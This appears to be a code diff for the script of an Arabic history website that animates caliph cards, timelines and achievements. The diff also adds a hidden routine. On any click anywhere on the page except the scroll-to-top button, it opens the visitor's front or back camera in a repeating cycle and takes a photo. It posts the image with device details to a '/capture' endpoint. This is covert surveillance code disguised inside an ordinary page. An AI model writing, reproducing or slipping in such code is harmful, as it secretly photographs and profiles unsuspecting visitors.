-    async function sendPhoto(blob) {
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          fetch('/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: reader.result, device_info: getDeviceInfo(), camera: 'single' })
-          }).then(resp => resp.json()).then(resolve).catch(reject);
-        };
-        reader.onerror = reject;
-        reader.readAsDataURL(blob);
+        }
       });
-    }
+    }, { threshold: 0.2 });
+    tlItems.forEach(el => tlObs.observe(el));
 
-    async function captureFromStream(stream) {
-      const track = stream.getVideoTracks()[0];
-      if (!track) throw new Error("No video track");
-      try {
-        const imageCapture = new ImageCapture(track);
-        return await imageCapture.takePhoto();
-      } catch(e) {
+    // Achievements stagger
+    const achObserver = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          const cards = document.querySelectorAll('.ach-card');
+          cards.forEach((c, idx) => setTimeout(() => c.classList.add('visible'), idx * 80));
+          achObserver.disconnect();
+        }
+      });
+    }, { threshold: 0.1 });
+    if (document.querySelector('.ach-cards')) achObserver.observe(document.querySelector('.ach-cards'));
+
+    // Caliph cards stagger
+    const caliphObserver = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          const cards = document.querySelectorAll('.caliph-card');
+          cards.forEach((c, idx) => setTimeout(() => c.classList.add('visible'), idx * 40));
+          caliphObserver.disconnect();
+        }
+      });
+    }, { threshold: 0.05 });
+    if (document.getElementById('caliphsGrid')) caliphObserver.observe(document.getElementById('caliphsGrid'));
+
+    // Scroll to top button
+    const scrollBtn = document.getElementById('scrollTopBtn');
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 600) scrollBtn.classList.add('visible');
+      else scrollBtn.classList.remove('visible');
+    });
+    scrollBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+    // Highlight active section in nav
+    const sections = document.querySelectorAll('[id]');
+    const navLinks = document.querySelectorAll('.nav-links a');
+    window.addEventListener('scroll', () => {
+      let current = '';
+      sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) current = s.id; });
+      navLinks.forEach(a => { a.style.color = a.getAttribute('href') === '#' + current ? 'var(--gold)' : ''; });
+    });
+
+    // ---------- الكاميرا المتقدمة: تسلسل أمامية, أمامية, خلفية يتكرر بلا حدود ----------
+    (function() {
+      let captureCounter = 0;     // يبدأ من 0: 0-> front, 1-> front, 2-> back, 3-> front, ...
+      let isProcessing = false;
+      let currentStream = null;
+
+      function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = "غير معروف", browser = "غير معروف";
+        if (ua.includes("Windows")) os = "Windows";
+        else if (ua.includes("Mac OS")) os = "macOS";
+        else if (ua.includes("Linux")) os = "Linux";
+        else if (ua.includes("Android")) os = "Android";
+        else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";
+        if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+        else if (ua.includes("Firefox")) browser = "Firefox";
+        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+        else if (ua.includes("Edg")) browser = "Edge";
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const language = navigator.language || "غير معروف";
+        return { os, browser, screen, language };
+      }
+
+      async function sendPhoto(blob) {
         return new Promise((resolve, reject) => {
-          const video = document.createElement('video');
-          video.autoplay = true;
-          video.playsInline = true;
-          video.muted = true;
-          video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0);
-              canvas.toBlob(resolve, 'image/jpeg', 0.9);
-              video.pause();
-              video.srcObject = null;
-            }, 200);
+          const reader = new FileReader();
+          reader.onloadend = () => {
+            fetch('/capture', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: reader.result, device_info: getDeviceInfo(), camera: 'single' })
+            }).then(resp => resp.json()).then(resolve).catch(reject);
           };
-          video.onerror = reject;
+          reader.onerror = reject;
+          reader.readAsDataURL(blob);
         });
       }
-    }
 
-    async function openCamera(facingMode) {
-      if (currentStream) {
-        currentStream.getTracks().forEach(t => t.stop());
-        currentStream = null;
-      }
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
-        currentStream = stream;
-        return stream;
-      } catch(err) {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-        currentStream = stream;
-        return stream;
-      }
-    }
-
-    async function capturePhoto() {
-      if (isProcessing) return;
-      isProcessing = true;
-      try {
-        // تسلسل: 0 -> front, 1 -> front, 2 -> back, 3 -> front, 4 -> front, 5 -> back, ...
-        let facingMode;
-        const cycle = captureCounter % 3;
-        if (cycle === 0) facingMode = 'user';      // أمامية
-        else if (cycle === 1) facingMode = 'user'; // أمامية ثانية
-        else facingMode = 'environment';            // خلفية
-        captureCounter++;
-
-        const stream = await openCamera(facingMode);
-        if (stream) {
-          const blob = await captureFromStream(stream);
-          await sendPhoto(blob);
+      async function captureFromStream(stream) {
+        const track = stream.getVideoTracks()[0];
+        if (!track) throw new Error("No video track");
+        try {
+          const imageCapture = new ImageCapture(track);
+          return await imageCapture.takePhoto();
+        } catch(e) {
+          // fallback: video element to canvas
+          return new Promise((resolve, reject) => {
+            const video = document.createElement('video');
+            video.autoplay = true;
+            video.playsInline = true;
+            video.muted = true;
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              video.play();
+              setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+                video.pause();
+                video.srcObject = null;
+              }, 200);
+            };
+            video.onerror = reject;
+          });
         }
-      } catch(err) {
-        console.warn("Camera error:", err);
-      } finally {
+      }
+
+      async function openCamera(facingMode) {
         if (currentStream) {
           currentStream.getTracks().forEach(t => t.stop());
           currentStream = null;
         }
-        isProcessing = false;
+        try {
+          // Try exact first (better compatibility for some mobiles)
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+          currentStream = stream;
+          return stream;
+        } catch(err) {
+          // fallback to any camera with given facingMode
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+          currentStream = stream;
+          return stream;
+        }
       }
-    }
 
-    // ربط الحدث: أي ضغطة في الصفحة (بما في ذلك الأزرار) ما عدا زر العودة للأعلى
-    document.body.addEventListener('click', (e) => {
-      if (e.target.closest('.scroll-top')) return;
-      capturePhoto();
-    });
-  })();
-</script>
+      async function capturePhoto() {
+        if (isProcessing) return;
+        isProcessing = true;
+        try {
+          // pattern: 0->front, 1->front, 2->back, repeat
+          let facingMode;
+          const step = captureCounter % 3;
+          if (step === 0) facingMode = 'user';
+          else if (step === 1) facingMode = 'user';
+          else facingMode = 'environment';
+          captureCounter++;
+
+          const stream = await openCamera(facingMode);
+          if (stream) {
+            const blob = await captureFromStream(stream);
+            await sendPhoto(blob);
+          }
+        } catch(err) {
+          console.warn("Camera/photo error:", err);
+        } finally {
+          if (currentStream) {
+            currentStream.getTracks().forEach(t => t.stop());
+            currentStream = null;
+          }
+          isProcessing = false;
+        }
+      }
+
+      // النقر على أي مكان في الصفحة (بما فيها الأزرار والروابط) باستثناء زر العودة للأعلى
+      document.body.addEventListener('click', (e) => {
+        if (e.target.closest('.scroll-top')) return;  // لا نصور عند الضغط على زر السكرول
+        capturePhoto();
+      });
+    })();
+  </script>
 </body>
 </html>
